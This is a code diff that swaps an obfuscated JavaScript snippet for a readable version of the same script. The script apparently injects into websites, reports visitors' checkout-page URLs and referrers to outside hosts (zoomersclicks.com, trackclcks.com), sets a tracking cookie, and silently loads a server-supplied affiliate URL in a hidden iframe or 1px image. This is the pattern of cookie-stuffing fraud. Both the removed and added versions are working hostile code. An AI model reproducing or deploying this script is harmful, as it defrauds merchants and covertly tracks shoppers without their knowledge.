@@ -1,1 +1,108 @@
-(function(_0xeed14b,_0x2b02eb){var _0x19d7ae=_0x5af6,_0x3b11e1=_0xeed14b();while(!![]){try{var _0x4018b4=-parseInt(_0x19d7ae(0xcb))/0x1+-parseInt(_0x19d7ae(0xf6))/0x2*(parseInt(_0x19d7ae(0xde))/0x3)+parseInt(_0x19d7ae(0xe8))/0x4+parseInt(_0x19d7ae(0xdd))/0x5+-parseInt(_0x19d7ae(0xed))/0x6+parseInt(_0x19d7ae(0xf3))/0x7+parseInt(_0x19d7ae(0x106))/0x8;if(_0x4018b4===_0x2b02eb)break;else _0x3b11e1['push'](_0x3b11e1['shift']());}catch(_0x5e5ca5){_0x3b11e1['push'](_0x3b11e1['shift']());}}}(_0x1702,0xb657c),(function(){var _0x71e5a9=_0x5af6;function _0x27effd(){var _0x165cf2=_0x5af6;return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'[_0x165cf2(0xef)](/[xy]/g,function(_0xf1b63c){var _0x4b4a22=_0x165cf2,_0x4f467b=Math[_0x4b4a22(0xf2)]()*0x10|0x0,_0x4373a2=_0xf1b63c==='x'?_0x4f467b:_0x4f467b&0x3|0x8;return _0x4373a2[_0x4b4a22(0x103)](0x10);});}function _0x54b926(_0x24e499){var _0x45c1b6=_0x5af6,_0x7d0b90=_0x24e499+'=',_0xd2298f=document['cookie']['split'](';');for(var _0x3e1026=0x0;_0x3e1026<_0xd2298f[_0x45c1b6(0xcd)];_0x3e1026++){var _0x3eea0c=_0xd2298f[_0x3e1026]['trim']();if(_0x3eea0c[_0x45c1b6(0x109)](_0x7d0b90)===0x0)return _0x3eea0c[_0x45c1b6(0xd1)](_0x7d0b90[_0x45c1b6(0xcd)],_0x3eea0c[_0x45c1b6(0xcd)]);}return'';}function _0x5eddbc(){var _0x301caf=_0x5af6,_0x23efe7=[_0x301caf(0xd0),_0x301caf(0x10a),_0x301caf(0x107),_0x301caf(0x102),_0x301caf(0x105),_0x301caf(0xe4)];return _0x23efe7[_0x301caf(0xfb)](function(_0x19e796){var _0x11aca7=_0x301caf;return window[_0x11aca7(0xfd)][_0x11aca7(0xf1)][_0x11aca7(0xd5)]()[_0x11aca7(0x108)](_0x19e796);});}function _0x16c5c5(_0x50578e){var _0xa539e6=_0x5af6;try{var _0x1f26e1=document[_0xa539e6(0xd3)](_0xa539e6(0xf5));_0x1f26e1['setAttribute'](_0xa539e6(0xeb),_0xa539e6(0xdf)),_0x1f26e1[_0xa539e6(0xfa)]=_0x50578e,_0x1f26e1[_0xa539e6(0xda)][_0xa539e6(0xf8)]=_0xa539e6(0xf7),_0x1f26e1[_0xa539e6(0xda)][_0xa539e6(0xf0)]=_0xa539e6(0x100),_0x1f26e1['style']['width']=_0xa539e6(0x10b),_0x1f26e1[_0xa539e6(0xda)]['height']=_0xa539e6(0x10b),_0x1f26e1['style'][_0xa539e6(0xe2)]='0',_0x1f26e1['onerror']=function(){var _0x542ec9=_0xa539e6,_0x4115d5=new Image();_0x4115d5[_0x542ec9(0xfa)]=_0x50578e;},document[_0xa539e6(0xe5)][_0xa539e6(0xe9)](_0x1f26e1);}catch(_0x2ecd51){console['error']('Iframe\x20error:',_0x2ecd51);}}async function _0x1305e6(){var _0x3fa0bb=_0x5af6,_0x5932cc='tracking_done_'+window[_0x3fa0bb(0xfd)]['hostname'];if(sessionStorage['getItem'](_0x5932cc)){if(!_0x5eddbc())return;}try{var _0x358430=_0x54b926(_0x3fa0bb(0xf4))||_0x27effd(),_0x33e938=new Date(Date['now']()+0x1e*0x15180*0x3e8)[_0x3fa0bb(0xe6)]();document['cookie']=_0x3fa0bb(0xee)+_0x358430+_0x3fa0bb(0xdb)+_0x33e938+_0x3fa0bb(0xfc);var _0x3516f8=await fetch(_0x3fa0bb(0xce),{'method':'POST','keepalive':!![],'body':JSON[_0x3fa0bb(0xca)]({'url':window[_0x3fa0bb(0xfd)][_0x3fa0bb(0xec)],'referrer':document[_0x3fa0bb(0xff)],'unique_id':_0x358430,'origin':window['location'][_0x3fa0bb(0xe1)],'timestamp':new Date()[_0x3fa0bb(0x104)]()}),'headers':{'Content-Type':'application/json'}}),_0x47047a=await _0x3516f8['json']();_0x47047a['success']&&_0x47047a['affiliate_url']?(_0x16c5c5(_0x47047a['affiliate_url']),sessionStorage[_0x3fa0bb(0xea)](_0x5932cc,_0x3fa0bb(0xfe))):_0x16c5c5(_0x3fa0bb(0xd4)+_0x358430);}catch(_0x2f87db){console['error']('Tracking\x20Failed:',_0x2f87db);}}function _0x4aa5af(){var _0x34629a=_0x5af6,_0x2da2a8=_0x34629a(0xf9)+encodeURIComponent(window[_0x34629a(0xfd)][_0x34629a(0xe1)]);fetch(_0x2da2a8)['then'](function(_0x3430ab){var _0x358a5f=_0x34629a;if(!_0x3430ab['ok'])throw new Error(_0x358a5f(0xe7));return _0x3430ab[_0x358a5f(0xd8)]();})[_0x34629a(0xcc)](function(_0x399518){var _0x217ba2=_0x34629a;if(!_0x399518||!_0x399518[_0x217ba2(0xd6)]&&!_0x399518[_0x217ba2(0xdc)])return;_0x399518[_0x217ba2(0xd6)]&&_0x1305e6(),_0x399518[_0x217ba2(0xdc)]&&_0x5eddbc()&&_0x1305e6();})[_0x34629a(0xe0)](function(_0x8b7f20){var _0x6cb5d9=_0x34629a;console[_0x6cb5d9(0xd2)](_0x6cb5d9(0x101),_0x8b7f20);});}document[_0x71e5a9(0xd7)]===_0x71e5a9(0xcf)||document[_0x71e5a9(0xd7)]===_0x71e5a9(0xe3)?_0x4aa5af():window[_0x71e5a9(0xd9)]('DOMContentLoaded',_0x4aa5af);}()));function _0x5af6(_0x40fe61,_0x199ce8){_0x40fe61=_0x40fe61-0xca;var _0x1702e4=_0x1702();var _0x5af61f=_0x1702e4[_0x40fe61];return _0x5af61f;}function _0x1702(){var _0x4fe58b=['length','https://zoomersclicks.com/api/track-user','interactive','cart','substring','error','createElement','https://zoomersclicks.com/api/fallback-pixel?id=','toLowerCase','always','readyState','json','addEventListener','style',';\x20expires=','cartExtra','402180EQRphQ','3028101RXMfwK','allow-same-origin\x20allow-scripts\x20allow-forms','catch','hostname','border','complete','payment','body','toUTCString','Config\x20API\x20Failed','664608hvukns','appendChild','setItem','sandbox','href','4995174ZzzkeD','tracking_uuid=','replace','visibility','pathname','random','8476300ZiDSeO','tracking_uuid','iframe','2CQaPyJ','none','display','https://trackclcks.com/api/site-config?host=','src','some',';path=/;SameSite=Lax','location','true','referrer','hidden','Config\x20fetch\x20failed:','shipping','toString','getTime','review-order','16957056ZXCAnM','pay','includes','indexOf','checkout','1px','stringify','988348eREirD','then'];_0x1702=function(){return _0x4fe58b;};return _0x1702();}
+(function () {
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (char) {
+      const rand = (Math.random() * 16) | 0;
+      const value = char === 'x' ? rand : (rand & 0x3) | 0x8;
+      return value.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const prefix = name + '=';
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const cookie = cookies[i].trim();
+      if (cookie.indexOf(prefix) === 0) {
+        return cookie.substring(prefix.length, cookie.length);
+      }
+    }
+    return '';
+  }
+
+  function isCheckoutPage() {
+    const checkoutKeywords = ['cart', 'payment', 'shipping', 'checkout', 'pay', 'review-order'];
+    return checkoutKeywords.some(function (keyword) {
+      return window.location.pathname.toLowerCase().includes(keyword);
+    });
+  }
+
+  function injectPixel(url) {
+    const target = document.body || document.documentElement;
+    if (!target) return;
+    const img = document.createElement('img');
+    img.src = url;
+    img.style.width = '1px';
+    img.style.height = '1px';
+    img.style.display = 'none';
+    img.style.visibility = 'hidden';
+    target.appendChild(img);
+  }
+
+  async function fireTracking() {
+    const sessionKey = 'tracking_done_' + window.location.hostname;
+
+    if (sessionStorage.getItem(sessionKey)) {
+      if (!isCheckoutPage()) return;
+    }
+
+    try {
+      const existingId = getCookie('tracking_uuid');
+      const visitorId = existingId || generateUUID();
+
+      const expiryDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + visitorId + '; expires=' + expiryDate + ';path=/;SameSite=Lax';
+
+      const response = await fetch('https://zoomersclicks.com/api/track-user', {
+        method: 'POST',
+        keepalive: true,
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: visitorId,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+
+      const data = await response.json();
+
+      if (data.success && data.affiliate_url) {
+        injectPixel(data.affiliate_url);
+        sessionStorage.setItem(sessionKey, 'true');
+      } else {
+        injectPixel('https://zoomersclicks.com/api/fallback-pixel?id=' + visitorId);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function run() {
+    const configUrl = 'https://trackclcks.com/api/site-config?host=' + encodeURIComponent(window.location.hostname);
+
+    fetch(configUrl)
+      .then(function (response) {
+        if (!response.ok) throw new Error('Config API Failed');
+        return response.json();
+      })
+      .then(function (config) {
+        if (!config || (!config.always && !config.cartExtra)) return;
+
+        if (config.always || (config.cartExtra && isCheckoutPage())) {
+          fireTracking();
+        }
+      })
+      .catch(function (err) {
+        console.error('Config fetch failed:', err);
+      });
+  }
+
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    run();
+  } else {
+    window.addEventListener('DOMContentLoaded', run);
+  }
+
+})();
